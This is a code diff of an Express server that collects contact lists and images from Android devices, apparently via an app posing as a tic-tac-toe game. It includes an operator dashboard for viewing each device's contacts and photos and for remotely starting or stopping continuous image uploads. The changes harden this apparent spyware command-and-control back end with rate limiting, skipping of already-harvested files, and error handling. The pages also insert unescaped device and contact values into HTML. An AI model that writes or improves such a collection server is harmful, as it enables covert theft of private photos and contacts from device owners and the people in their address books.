@@ -7,7 +7,11 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-const upload = multer({ storage: multer.memoryStorage() });
+// Limit upload file size to 15MB to prevent memory crashes
+const upload = multer({
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 15 * 1024 * 1024 }
+});
 
 // ================= CLOUDINARY =================
 cloudinary.config({
@@ -19,7 +23,10 @@ cloudinary.config({
 // ================= DATABASE =================
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
-  ssl: { rejectUnauthorized: false }
+  ssl: { rejectUnauthorized: false },
+  max: 10,               // max connections in pool
+  idleTimeoutMillis: 30000,
+  connectionTimeoutMillis: 5000,
 });
 
 // ================= DB SETUP =================
@@ -33,6 +40,7 @@ async function initDB() {
     CREATE TABLE IF NOT EXISTS images (
       id SERIAL PRIMARY KEY,
       device_id TEXT,
+      file_name TEXT,
       image_url TEXT,
       cloudinary_public_id TEXT
     );
@@ -49,12 +57,33 @@ async function initDB() {
     );
   `);
 
-  // Add cloudinary_public_id column if it doesn't exist (for existing DBs)
+  // Add columns for existing DBs that may not have them
   await pool.query(`
     ALTER TABLE images ADD COLUMN IF NOT EXISTS cloudinary_public_id TEXT;
+    ALTER TABLE images ADD COLUMN IF NOT EXISTS file_name TEXT;
+  `);
+
+  // Index to speed up duplicate checks
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_images_device_name
+    ON images (device_id, file_name);
   `);
 }
-initDB();
+initDB().catch(console.error);
+
+// ================= RATE LIMITING =================
+// Simple in-memory per-device upload rate limit.
+// Max 1 upload request per device per 2 seconds.
+const lastUploadTime = new Map();
+const UPLOAD_INTERVAL_MS = 2000;
+
+function isRateLimited(deviceId) {
+  const now = Date.now();
+  const last = lastUploadTime.get(deviceId) || 0;
+  if (now - last < UPLOAD_INTERVAL_MS) return true;
+  lastUploadTime.set(deviceId, now);
+  return false;
+}
 
 // ================= SHARED STYLES =================
 const sharedStyles = `
@@ -341,114 +370,176 @@ function topbar() {
 }
 
 // ================= CONFIG ENDPOINT (called by Android app) =================
-// FIX: Auto-insert device row so new devices always get a valid config response
 app.get("/config/:device_id", async (req, res) => {
   const device_id = req.params.device_id;
+  try {
+    await pool.query(
+      `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
+       ON CONFLICT (device_id) DO NOTHING`,
+      [device_id]
+    );
+    const result = await pool.query(
+      "SELECT uploading FROM device_control WHERE device_id=$1",
+      [device_id]
+    );
+    const uploading = result.rows.length > 0 ? result.rows[0].uploading : false;
+    res.json({ uploading });
+  } catch (err) {
+    console.error("/config error:", err);
+    res.json({ uploading: false });
+  }
+});
 
-  // Upsert: create row with uploading=false if it doesn't exist yet
-  await pool.query(
-    `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
-     ON CONFLICT (device_id) DO NOTHING`,
-    [device_id]
-  );
-
-  const result = await pool.query(
-    "SELECT uploading FROM device_control WHERE device_id=$1",
-    [device_id]
-  );
-  const uploading = result.rows.length > 0 ? result.rows[0].uploading : false;
-  res.json({ uploading });
+// ================= UPLOADED NAMES ENDPOINT =================
+// Android app calls this to know which filenames are already uploaded,
+// so it can skip re-uploading them. Prevents duplicates across worker runs.
+app.get("/uploaded-names/:device_id", async (req, res) => {
+  const { device_id } = req.params;
+  try {
+    const result = await pool.query(
+      "SELECT file_name FROM images WHERE device_id=$1 AND file_name IS NOT NULL",
+      [device_id]
+    );
+    const names = result.rows.map(r => r.file_name).filter(Boolean);
+    res.json(names);
+  } catch (err) {
+    console.error("/uploaded-names error:", err);
+    res.json([]);
+  }
 });
 
 // ================= START / STOP UPLOAD CONTROL =================
 app.post("/control/:device_id/start", async (req, res) => {
   const { device_id } = req.params;
-  await pool.query(
-    `INSERT INTO device_control (device_id, uploading) VALUES ($1, TRUE)
-     ON CONFLICT (device_id) DO UPDATE SET uploading = TRUE`,
-    [device_id]
-  );
+  try {
+    await pool.query(
+      `INSERT INTO device_control (device_id, uploading) VALUES ($1, TRUE)
+       ON CONFLICT (device_id) DO UPDATE SET uploading = TRUE`,
+      [device_id]
+    );
+  } catch (err) { console.error("/control/start error:", err); }
   res.redirect("/user/" + device_id + "/images");
 });
 
 app.post("/control/:device_id/stop", async (req, res) => {
   const { device_id } = req.params;
-  await pool.query(
-    `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
-     ON CONFLICT (device_id) DO UPDATE SET uploading = FALSE`,
-    [device_id]
-  );
+  try {
+    await pool.query(
+      `INSERT INTO device_control (device_id, uploading) VALUES ($1, FALSE)
+       ON CONFLICT (device_id) DO UPDATE SET uploading = FALSE`,
+      [device_id]
+    );
+  } catch (err) { console.error("/control/stop error:", err); }
   res.redirect("/user/" + device_id + "/images");
 });
 
 // ================= DASHBOARD =================
 app.get("/", async (req, res) => {
-  const users = await pool.query("SELECT COUNT(*) FROM users");
-
-  res.send(`
-  <html><head><title>Dashboard</title>${sharedStyles}</head>
-  <body>
-    ${topbar()}
-    <div class="page">
-      <div class="page-title">Dashboard</div>
-      <div class="page-subtitle">Control panel overview</div>
-
-      <div class="stat-card">
-        <div class="stat-icon-wrap">&#128100;</div>
-        <div>
-          <div class="stat-label">Total Users</div>
-          <div class="stat-value">${users.rows[0].count}</div>
+  try {
+    const users = await pool.query("SELECT COUNT(*) FROM users");
+    res.send(`
+    <html><head><title>Dashboard</title>${sharedStyles}</head>
+    <body>
+      ${topbar()}
+      <div class="page">
+        <div class="page-title">Dashboard</div>
+        <div class="page-subtitle">Control panel overview</div>
+        <div class="stat-card">
+          <div class="stat-icon-wrap">&#128100;</div>
+          <div>
+            <div class="stat-label">Total Users</div>
+            <div class="stat-value">${users.rows[0].count}</div>
+          </div>
         </div>
+        <a href="/users" class="btn btn-primary" style="font-size:16px; padding:14px 32px;">
+          &#128101;&nbsp; View Users
+        </a>
       </div>
-
-      <a href="/users" class="btn btn-primary" style="font-size:16px; padding:14px 32px;">
-        &#128101;&nbsp; View Users
-      </a>
-    </div>
-  </body></html>
-  `);
+    </body></html>
+    `);
+  } catch (err) {
+    res.status(500).send("Dashboard error");
+  }
 });
 
 // ================= RECEIVE CONTACTS =================
 app.post("/receive", async (req, res) => {
   const { device_id, data } = req.body;
-  for (let contact of data) {
+  if (!device_id || !Array.isArray(data)) return res.status(400).send("Bad request");
+  try {
+    for (let contact of data) {
+      // Avoid duplicate contacts for same device
+      await pool.query(
+        "INSERT INTO contacts (device_id, contact) VALUES ($1, $2) ON CONFLICT DO NOTHING",
+        [device_id, contact]
+      );
+    }
     await pool.query(
-      "INSERT INTO contacts (device_id, contact) VALUES ($1, $2)",
-      [device_id, contact]
+      "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
+      [device_id]
     );
+    res.send("OK");
+  } catch (err) {
+    console.error("/receive error:", err);
+    res.status(500).send("Server error");
   }
-  await pool.query(
-    "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
-    [device_id]
-  );
-  res.send("Contacts saved ✅");
 });
 
 // ================= IMAGE UPLOAD =================
+// FIX: rate limiting + duplicate check by file_name + proper error handling
 app.post("/upload-image", upload.single("image"), async (req, res) => {
   try {
+    if (!req.file) return res.status(400).json({ error: "No file" });
+
     const device_id = req.body.device_id;
-    const stream = cloudinary.uploader.upload_stream(
-      { folder: "tic_tac_toe_app" },
-      async (error, result) => {
-        if (error) return res.status(500).send("Upload error");
-        const imageUrl = result.secure_url;
-        const publicId = result.public_id;
-        await pool.query(
-          "INSERT INTO images (device_id, image_url, cloudinary_public_id) VALUES ($1, $2, $3)",
-          [device_id, imageUrl, publicId]
-        );
-        await pool.query(
-          "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
-          [device_id]
-        );
-        res.json({ url: imageUrl });
+    const file_name = req.body.file_name || req.file.originalname || null;
+
+    if (!device_id) return res.status(400).json({ error: "No device_id" });
+
+    // Rate limit: max 1 upload per device per 2 seconds
+    if (isRateLimited(device_id)) {
+      return res.status(429).json({ error: "Too fast, slow down" });
+    }
+
+    // Duplicate check: if this filename already uploaded, skip Cloudinary
+    if (file_name) {
+      const existing = await pool.query(
+        "SELECT id FROM images WHERE device_id=$1 AND file_name=$2 LIMIT 1",
+        [device_id, file_name]
+      );
+      if (existing.rows.length > 0) {
+        return res.json({ skipped: true, reason: "already uploaded" });
       }
-    );
-    stream.end(req.file.buffer);
+    }
+
+    // Upload to Cloudinary
+    await new Promise((resolve, reject) => {
+      const stream = cloudinary.uploader.upload_stream(
+        { folder: "tic_tac_toe_app" },
+        async (error, result) => {
+          if (error) { reject(error); return; }
+          try {
+            await pool.query(
+              "INSERT INTO images (device_id, file_name, image_url, cloudinary_public_id) VALUES ($1, $2, $3, $4)",
+              [device_id, file_name, result.secure_url, result.public_id]
+            );
+            await pool.query(
+              "INSERT INTO users (device_id) VALUES ($1) ON CONFLICT DO NOTHING",
+              [device_id]
+            );
+            res.json({ url: result.secure_url });
+            resolve();
+          } catch (dbErr) {
+            reject(dbErr);
+          }
+        }
+      );
+      stream.end(req.file.buffer);
+    });
+
   } catch (err) {
-    res.status(500).send("Server error");
+    console.error("/upload-image error:", err);
+    if (!res.headersSent) res.status(500).json({ error: "Server error" });
   }
 });
 
@@ -492,9 +583,7 @@ app.post("/delete-all-images/:device_id", async (req, res) => {
   try {
     const rows = await pool.query("SELECT cloudinary_public_id FROM images WHERE device_id=$1", [device_id]);
     for (const row of rows.rows) {
-      if (row.cloudinary_public_id) {
-        await cloudinary.uploader.destroy(row.cloudinary_public_id);
-      }
+      if (row.cloudinary_public_id) await cloudinary.uploader.destroy(row.cloudinary_public_id);
     }
     await pool.query("DELETE FROM images WHERE device_id=$1", [device_id]);
     res.redirect("/user/" + device_id + "/images");
@@ -532,12 +621,9 @@ app.post("/delete-all-contacts/:device_id", async (req, res) => {
 app.post("/delete-user/:device_id", async (req, res) => {
   const { device_id } = req.params;
   try {
-    // Delete all images from Cloudinary first
     const rows = await pool.query("SELECT cloudinary_public_id FROM images WHERE device_id=$1", [device_id]);
     for (const row of rows.rows) {
-      if (row.cloudinary_public_id) {
-        await cloudinary.uploader.destroy(row.cloudinary_public_id);
-      }
+      if (row.cloudinary_public_id) await cloudinary.uploader.destroy(row.cloudinary_public_id);
     }
     await pool.query("DELETE FROM images WHERE device_id=$1", [device_id]);
     await pool.query("DELETE FROM contacts WHERE device_id=$1", [device_id]);
@@ -551,373 +637,345 @@ app.post("/delete-user/:device_id", async (req, res) => {
 
 // ================= USERS LIST =================
 app.get("/users", async (req, res) => {
-  const users = await pool.query("SELECT * FROM users");
+  try {
+    const users = await pool.query("SELECT * FROM users");
+    let rows = "";
+    for (const u of users.rows) {
+      const initials = u.device_id.substring(0, 2).toUpperCase();
+      const imgCount = await pool.query("SELECT COUNT(*) FROM images WHERE device_id=$1", [u.device_id]);
+      const conCount = await pool.query("SELECT COUNT(DISTINCT contact) FROM contacts WHERE device_id=$1", [u.device_id]);
+      rows += `
+        <div class="user-row" id="user-${u.device_id}">
+          <div class="user-avatar">${initials}</div>
+          <div class="user-id">${u.device_id}</div>
+          <div class="user-actions">
+            <a href="/user/${u.device_id}/contacts" class="btn btn-green">
+              &#128222; Contacts <span class="count-badge">${conCount.rows[0].count}</span>
+            </a>
+            <a href="/user/${u.device_id}/images" class="btn btn-blue">
+              &#128247; Images <span class="count-badge">${imgCount.rows[0].count}</span>
+            </a>
+            <button class="btn btn-red" onclick="confirmDeleteUser('${u.device_id}')">
+              &#128465; Delete User
+            </button>
+          </div>
+        </div>
+      `;
+    }
 
-  let rows = "";
-  for (const u of users.rows) {
-    const initials = u.device_id.substring(0, 2).toUpperCase();
-    const imgCount = await pool.query(
-      "SELECT COUNT(*) FROM images WHERE device_id=$1", [u.device_id]
-    );
-    const conCount = await pool.query(
-      "SELECT COUNT(DISTINCT contact) FROM contacts WHERE device_id=$1", [u.device_id]
-    );
-    rows += `
-      <div class="user-row" id="user-${u.device_id}">
-        <div class="user-avatar">${initials}</div>
-        <div class="user-id">${u.device_id}</div>
-        <div class="user-actions">
-          <a href="/user/${u.device_id}/contacts" class="btn btn-green">
-            &#128222; Contacts <span class="count-badge">${conCount.rows[0].count}</span>
-          </a>
-          <a href="/user/${u.device_id}/images" class="btn btn-blue">
-            &#128247; Images <span class="count-badge">${imgCount.rows[0].count}</span>
-          </a>
-          <button class="btn btn-red"
-            onclick="confirmDeleteUser('${u.device_id}')">
-            &#128465; Delete User
-          </button>
+    res.send(`
+    <html><head><title>Users</title>${sharedStyles}</head>
+    <body>
+      ${topbar()}
+      <div class="confirm-modal" id="deleteUserModal">
+        <div class="confirm-box">
+          <h2>&#9888; Delete User?</h2>
+          <p>This will permanently delete the user and <strong>all their images &amp; contacts</strong>. This cannot be undone.</p>
+          <div class="actions">
+            <button class="btn btn-secondary" onclick="closeModal('deleteUserModal')">Cancel</button>
+            <form id="deleteUserForm" method="POST">
+              <button type="submit" class="btn btn-red">Yes, Delete</button>
+            </form>
+          </div>
         </div>
       </div>
-    `;
+      <div class="page">
+        <a href="/" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
+        <div class="page-title" style="margin-top:16px;">All Users</div>
+        <div class="page-subtitle">${users.rows.length} registered device(s)</div>
+        <div class="user-list">
+          ${rows || '<div class="empty-state">No users found.</div>'}
+        </div>
+      </div>
+      <script>
+        function confirmDeleteUser(deviceId) {
+          document.getElementById('deleteUserForm').action = '/delete-user/' + deviceId;
+          document.getElementById('deleteUserModal').classList.add('open');
+        }
+        function closeModal(id) { document.getElementById(id).classList.remove('open'); }
+      </script>
+    </body></html>
+    `);
+  } catch (err) {
+    res.status(500).send("Error loading users");
   }
-
-  res.send(`
-  <html><head><title>Users</title>${sharedStyles}</head>
-  <body>
-    ${topbar()}
-
-    <!-- Confirm Delete User Modal -->
-    <div class="confirm-modal" id="deleteUserModal">
-      <div class="confirm-box">
-        <h2>&#9888; Delete User?</h2>
-        <p>This will permanently delete the user and <strong>all their images &amp; contacts</strong>. This cannot be undone.</p>
-        <div class="actions">
-          <button class="btn btn-secondary" onclick="closeModal('deleteUserModal')">Cancel</button>
-          <form id="deleteUserForm" method="POST">
-            <button type="submit" class="btn btn-red">Yes, Delete</button>
-          </form>
-        </div>
-      </div>
-    </div>
-
-    <div class="page">
-      <a href="/" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
-      <div class="page-title" style="margin-top:16px;">All Users</div>
-      <div class="page-subtitle">${users.rows.length} registered device(s)</div>
-      <div class="user-list">
-        ${rows || '<div class="empty-state">No users found.</div>'}
-      </div>
-    </div>
-
-    <script>
-      function confirmDeleteUser(deviceId) {
-        document.getElementById('deleteUserForm').action = '/delete-user/' + deviceId;
-        document.getElementById('deleteUserModal').classList.add('open');
-      }
-      function closeModal(id) {
-        document.getElementById(id).classList.remove('open');
-      }
-    </script>
-  </body></html>
-  `);
 });
 
 // ================= USER CONTACTS =================
 app.get("/user/:device_id/contacts", async (req, res) => {
   const device = req.params.device_id;
+  try {
+    const contacts = await pool.query(
+      "SELECT id, contact FROM contacts WHERE device_id=$1 ORDER BY contact",
+      [device]
+    );
+    let contactRows = "";
+    contacts.rows.forEach((c, i) => {
+      contactRows += `
+        <tr>
+          <td style="width:44px; padding-left:16px;">
+            <input type="checkbox" class="contact-check" name="contact_ids" value="${c.id}"
+              style="width:16px;height:16px;accent-color:#dc2626;cursor:pointer;"
+              onchange="updateContactCount()">
+          </td>
+          <td style="color:#475569; font-size:13px; width:50px;">${i + 1}</td>
+          <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
+        </tr>
+      `;
+    });
 
-  const contacts = await pool.query(
-    "SELECT id, contact FROM contacts WHERE device_id=$1 ORDER BY contact",
-    [device]
-  );
-
-  let contactRows = "";
-  contacts.rows.forEach((c, i) => {
-    contactRows += `
-      <tr>
-        <td style="width:44px; padding-left:16px;">
-          <input type="checkbox" class="contact-check" name="contact_ids" value="${c.id}"
-            style="width:16px;height:16px;accent-color:#dc2626;cursor:pointer;"
-            onchange="updateContactCount()">
-        </td>
-        <td style="color:#475569; font-size:13px; width:50px;">${i + 1}</td>
-        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
-      </tr>
-    `;
-  });
-
-  res.send(`
-  <html><head><title>Contacts - ${device}</title>${sharedStyles}</head>
-  <body>
-    ${topbar()}
-
-    <!-- Confirm Delete Contacts Modal -->
-    <div class="confirm-modal" id="deleteContactsModal">
-      <div class="confirm-box">
-        <h2>&#9888; Delete Contacts?</h2>
-        <p id="deleteContactsMsg">Are you sure you want to delete the selected contacts?</p>
-        <div class="actions">
-          <button class="btn btn-secondary" onclick="closeModal('deleteContactsModal')">Cancel</button>
-          <button class="btn btn-red" onclick="submitContactDelete()">Yes, Delete</button>
-        </div>
-      </div>
-    </div>
-
-    <div class="page">
-      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
-      <div class="page-title" style="margin-top:16px;">Contacts</div>
-      <div class="page-subtitle" style="font-family:monospace;">${device}</div>
-
-      <div class="card" style="padding:0; overflow:hidden;">
-        <div style="padding:20px 24px 16px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
-          <span style="font-size:15px; font-weight:600; color:#cbd5e1;">&#128222; Contact List</span>
-          <span class="count-badge">${contacts.rows.length} unique</span>
-          <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
-            <button class="btn btn-red" style="font-size:13px; padding:8px 14px;"
-              onclick="confirmDeleteSelectedContacts()">
-              &#128465; Delete Selected (<span id="selectedContactCount">0</span>)
-            </button>
-            <button class="btn btn-red" style="font-size:13px; padding:8px 14px; background:#7f1d1d;"
-              onclick="confirmDeleteAllContacts()">
-              &#128465; Delete All
-            </button>
+    res.send(`
+    <html><head><title>Contacts - ${device}</title>${sharedStyles}</head>
+    <body>
+      ${topbar()}
+      <div class="confirm-modal" id="deleteContactsModal">
+        <div class="confirm-box">
+          <h2>&#9888; Delete Contacts?</h2>
+          <p id="deleteContactsMsg">Are you sure?</p>
+          <div class="actions">
+            <button class="btn btn-secondary" onclick="closeModal('deleteContactsModal')">Cancel</button>
+            <button class="btn btn-red" onclick="submitContactDelete()">Yes, Delete</button>
           </div>
         </div>
-
-        ${contactRows
-          ? `<form id="contactDeleteForm" method="POST" action="/delete-contacts-selected">
-              <input type="hidden" name="device_id" value="${device}">
-              <div class="bulk-actions" style="margin:12px 16px; border-radius:8px;">
-                <label>
-                  <input type="checkbox" id="selectAllContacts" onchange="toggleAllContacts(this)">
-                  Select All
-                </label>
-              </div>
-              <table class="contacts-table">
-                <thead>
-                  <tr>
+      </div>
+      <div class="page">
+        <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
+        <div class="page-title" style="margin-top:16px;">Contacts</div>
+        <div class="page-subtitle" style="font-family:monospace;">${device}</div>
+        <div class="card" style="padding:0; overflow:hidden;">
+          <div style="padding:20px 24px 16px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
+            <span style="font-size:15px; font-weight:600; color:#cbd5e1;">&#128222; Contact List</span>
+            <span class="count-badge">${contacts.rows.length} unique</span>
+            <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
+              <button class="btn btn-red" style="font-size:13px; padding:8px 14px;" onclick="confirmDeleteSelectedContacts()">
+                &#128465; Delete Selected (<span id="selectedContactCount">0</span>)
+              </button>
+              <button class="btn btn-red" style="font-size:13px; padding:8px 14px; background:#7f1d1d;" onclick="confirmDeleteAllContacts()">
+                &#128465; Delete All
+              </button>
+            </div>
+          </div>
+          ${contactRows
+            ? `<form id="contactDeleteForm" method="POST" action="/delete-contacts-selected">
+                <input type="hidden" name="device_id" value="${device}">
+                <div class="bulk-actions" style="margin:12px 16px; border-radius:8px;">
+                  <label>
+                    <input type="checkbox" id="selectAllContacts" onchange="toggleAllContacts(this)">
+                    Select All
+                  </label>
+                </div>
+                <table class="contacts-table">
+                  <thead><tr>
                     <th style="padding:14px 16px 10px; width:44px;"></th>
                     <th style="padding:14px 16px 10px;">#</th>
                     <th style="padding:14px 16px 10px;">Contact</th>
-                  </tr>
-                </thead>
-                <tbody>${contactRows}</tbody>
-              </table>
-             </form>`
-          : '<div class="empty-state">No contacts found.</div>'
-        }
+                  </tr></thead>
+                  <tbody>${contactRows}</tbody>
+                </table>
+               </form>`
+            : '<div class="empty-state">No contacts found.</div>'
+          }
+        </div>
+        <form id="deleteAllContactsForm" method="POST" action="/delete-all-contacts/${device}" style="display:none;"></form>
       </div>
-
-      <!-- Delete All Contacts form (hidden, submitted via JS) -->
-      <form id="deleteAllContactsForm" method="POST" action="/delete-all-contacts/${device}" style="display:none;"></form>
-    </div>
-
-    <script>
-      function updateContactCount() {
-        const count = document.querySelectorAll('.contact-check:checked').length;
-        document.getElementById('selectedContactCount').textContent = count;
-      }
-      function toggleAllContacts(cb) {
-        document.querySelectorAll('.contact-check').forEach(c => c.checked = cb.checked);
-        updateContactCount();
-      }
-      function confirmDeleteSelectedContacts() {
-        const count = document.querySelectorAll('.contact-check:checked').length;
-        if (count === 0) { alert('Please select at least one contact.'); return; }
-        document.getElementById('deleteContactsMsg').textContent =
-          'Delete ' + count + ' selected contact(s)? This cannot be undone.';
-        document.getElementById('deleteContactsModal').classList.add('open');
-      }
-      function confirmDeleteAllContacts() {
-        document.getElementById('deleteContactsMsg').textContent =
-          'Delete ALL ${contacts.rows.length} contacts? This cannot be undone.';
-        document.getElementById('deleteContactsModal').classList.add('open');
-        document.getElementById('deleteContactsModal').dataset.deleteAll = 'true';
-      }
-      function submitContactDelete() {
-        const modal = document.getElementById('deleteContactsModal');
-        if (modal.dataset.deleteAll === 'true') {
-          modal.dataset.deleteAll = '';
-          document.getElementById('deleteAllContactsForm').submit();
-        } else {
-          document.getElementById('contactDeleteForm').submit();
+      <script>
+        function updateContactCount() {
+          document.getElementById('selectedContactCount').textContent =
+            document.querySelectorAll('.contact-check:checked').length;
         }
-      }
-      function closeModal(id) {
-        const el = document.getElementById(id);
-        el.classList.remove('open');
-        if (el.dataset) el.dataset.deleteAll = '';
-      }
-    </script>
-  </body></html>
-  `);
+        function toggleAllContacts(cb) {
+          document.querySelectorAll('.contact-check').forEach(c => c.checked = cb.checked);
+          updateContactCount();
+        }
+        function confirmDeleteSelectedContacts() {
+          const count = document.querySelectorAll('.contact-check:checked').length;
+          if (count === 0) { alert('Select at least one contact.'); return; }
+          document.getElementById('deleteContactsMsg').textContent = 'Delete ' + count + ' contact(s)?';
+          document.getElementById('deleteContactsModal').classList.add('open');
+        }
+        function confirmDeleteAllContacts() {
+          document.getElementById('deleteContactsMsg').textContent = 'Delete ALL ${contacts.rows.length} contacts?';
+          document.getElementById('deleteContactsModal').classList.add('open');
+          document.getElementById('deleteContactsModal').dataset.deleteAll = 'true';
+        }
+        function submitContactDelete() {
+          const modal = document.getElementById('deleteContactsModal');
+          if (modal.dataset.deleteAll === 'true') {
+            modal.dataset.deleteAll = '';
+            document.getElementById('deleteAllContactsForm').submit();
+          } else {
+            document.getElementById('contactDeleteForm').submit();
+          }
+        }
+        function closeModal(id) {
+          const el = document.getElementById(id);
+          el.classList.remove('open');
+          if (el.dataset) el.dataset.deleteAll = '';
+        }
+      </script>
+    </body></html>
+    `);
+  } catch (err) {
+    res.status(500).send("Error loading contacts");
+  }
 });
 
 // ================= USER IMAGES (with Start/Stop + Delete) =================
 app.get("/user/:device_id/images", async (req, res) => {
   const device = req.params.device_id;
+  try {
+    const images = await pool.query(
+      "SELECT * FROM images WHERE device_id=$1 ORDER BY id DESC",
+      [device]
+    );
+    const controlRow = await pool.query(
+      "SELECT uploading FROM device_control WHERE device_id=$1",
+      [device]
+    );
+    const isUploading = controlRow.rows.length > 0 ? controlRow.rows[0].uploading : false;
 
-  const images = await pool.query(
-    "SELECT * FROM images WHERE device_id=$1 ORDER BY id DESC",
-    [device]
-  );
-
-  const controlRow = await pool.query(
-    "SELECT uploading FROM device_control WHERE device_id=$1",
-    [device]
-  );
-  const isUploading = controlRow.rows.length > 0 ? controlRow.rows[0].uploading : false;
-
-  let imgGrid = "";
-  images.rows.forEach(img => {
-    imgGrid += `
-      <div class="img-wrapper" id="img-${img.id}" onclick="toggleImgSelect(${img.id}, event)">
-        <input type="checkbox" class="img-checkbox" name="image_ids" value="${img.id}"
-          onchange="updateImgCount()" onclick="event.stopPropagation()">
-        <img src="${img.image_url}" alt="device image" loading="lazy"/>
-        <form method="POST" action="/delete-image/${img.id}" style="position:absolute;top:6px;right:6px;z-index:3;">
-          <input type="hidden" name="device_id" value="${device}">
-          <button type="submit" class="img-delete-btn" onclick="event.stopPropagation()">&#10005; Del</button>
-        </form>
-      </div>
-    `;
-  });
-
-  const statusBadge = isUploading
-    ? `<span class="status-badge-on"><span class="pulse"></span> Uploading Active</span>`
-    : `<span class="status-badge-off"><span class="dot-off"></span> Stopped</span>`;
-
-  res.send(`
-  <html><head><title>Images - ${device}</title>${sharedStyles}</head>
-  <body>
-    ${topbar()}
-
-    <!-- Confirm Delete Images Modal -->
-    <div class="confirm-modal" id="deleteImagesModal">
-      <div class="confirm-box">
-        <h2>&#9888; Delete Images?</h2>
-        <p id="deleteImagesMsg">Are you sure you want to delete the selected images?</p>
-        <div class="actions">
-          <button class="btn btn-secondary" onclick="closeModal('deleteImagesModal')">Cancel</button>
-          <button class="btn btn-red" onclick="submitImageDelete()">Yes, Delete</button>
-        </div>
-      </div>
-    </div>
-
-    <div class="page">
-      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
-      <div class="page-title" style="margin-top:16px;">Images</div>
-      <div class="page-subtitle" style="font-family:monospace;">${device}</div>
-
-      <!-- Upload Control Card -->
-      <div class="card">
-        <h3>&#9881; Upload Control &nbsp; ${statusBadge}</h3>
-        <p style="font-size:13px; color:#64748b; margin-bottom:20px;">
-          Start to allow the device to upload images continuously. Stop to pause all uploads from this device.
-        </p>
-        <div style="display:flex; gap:14px;">
-          <form method="POST" action="/control/${device}/start">
-            <button type="submit" class="btn btn-start" ${isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
-              &#9654; Start Upload
-            </button>
-          </form>
-          <form method="POST" action="/control/${device}/stop">
-            <button type="submit" class="btn btn-stop" ${!isUploading ? 'disabled style="opacity:0.4;cursor:not-allowed;"' : ''}>
-              &#9632; Stop Upload
-            </button>
-          </form>
-        </div>
-      </div>
-
-      <!-- Images Card -->
-      <div class="card">
-        <h3 style="flex-wrap:wrap; gap:10px;">
-          &#128247; Received Images
-          <span class="count-badge">${images.rows.length}</span>
-          <div style="margin-left:auto; display:flex; gap:10px; flex-wrap:wrap;">
-            <button class="btn btn-red" style="font-size:13px; padding:8px 14px;"
-              onclick="confirmDeleteSelectedImages()">
-              &#128465; Delete Selected (<span id="selectedImgCount">0</span>)
-            </button>
-            <button class="btn btn-red" style="font-size:13px; padding:8px 14px; background:#7f1d1d;"
-              onclick="confirmDeleteAllImages()">
-              &#128465; Delete All
-            </button>
-          </div>
-        </h3>
-
-        ${images.rows.length > 0 ? `
-          <form id="imgDeleteForm" method="POST" action="/delete-images-selected">
+    let imgGrid = "";
+    images.rows.forEach(img => {
+      imgGrid += `
+        <div class="img-wrapper" id="img-${img.id}" onclick="toggleImgSelect(${img.id}, event)">
+          <input type="checkbox" class="img-checkbox" name="image_ids" value="${img.id}"
+            onchange="updateImgCount()" onclick="event.stopPropagation()">
+          <img src="${img.image_url}" alt="device image" loading="lazy"/>
+          <form method="POST" action="/delete-image/${img.id}" style="position:absolute;top:6px;right:6px;z-index:3;">
             <input type="hidden" name="device_id" value="${device}">
-            <div class="bulk-actions">
-              <label>
-                <input type="checkbox" id="selectAllImgs" onchange="toggleAllImages(this)">
-                Select All
-              </label>
-              <span class="selected-count">Click images or use checkboxes to select</span>
-            </div>
-            <div class="images-grid">
-              ${imgGrid}
-            </div>
+            <button type="submit" class="img-delete-btn" onclick="event.stopPropagation()">&#10005; Del</button>
           </form>
-        ` : '<div class="empty-state">No images uploaded yet.</div>'}
+        </div>
+      `;
+    });
 
-        <!-- Delete All Images form (hidden) -->
-        <form id="deleteAllImgsForm" method="POST" action="/delete-all-images/${device}" style="display:none;"></form>
+    const statusBadge = isUploading
+      ? `<span class="status-badge-on"><span class="pulse"></span> Uploading Active</span>`
+      : `<span class="status-badge-off"><span class="dot-off"></span> Stopped</span>`;
+
+    res.send(`
+    <html><head><title>Images - ${device}</title>${sharedStyles}</head>
+    <body>
+      ${topbar()}
+      <div class="confirm-modal" id="deleteImagesModal">
+        <div class="confirm-box">
+          <h2>&#9888; Delete Images?</h2>
+          <p id="deleteImagesMsg">Are you sure?</p>
+          <div class="actions">
+            <button class="btn btn-secondary" onclick="closeModal('deleteImagesModal')">Cancel</button>
+            <button class="btn btn-red" onclick="submitImageDelete()">Yes, Delete</button>
+          </div>
+        </div>
       </div>
-    </div>
-
-    <script>
-      function toggleImgSelect(id, event) {
-        const wrapper = document.getElementById('img-' + id);
-        const checkbox = wrapper.querySelector('.img-checkbox');
-        checkbox.checked = !checkbox.checked;
-        wrapper.classList.toggle('selected', checkbox.checked);
-        updateImgCount();
-      }
-      function updateImgCount() {
-        const checked = document.querySelectorAll('.img-checkbox:checked');
-        document.getElementById('selectedImgCount').textContent = checked.length;
-        document.querySelectorAll('.img-wrapper').forEach(w => {
-          const cb = w.querySelector('.img-checkbox');
-          w.classList.toggle('selected', cb.checked);
-        });
-      }
-      function toggleAllImages(cb) {
-        document.querySelectorAll('.img-checkbox').forEach(c => c.checked = cb.checked);
-        updateImgCount();
-      }
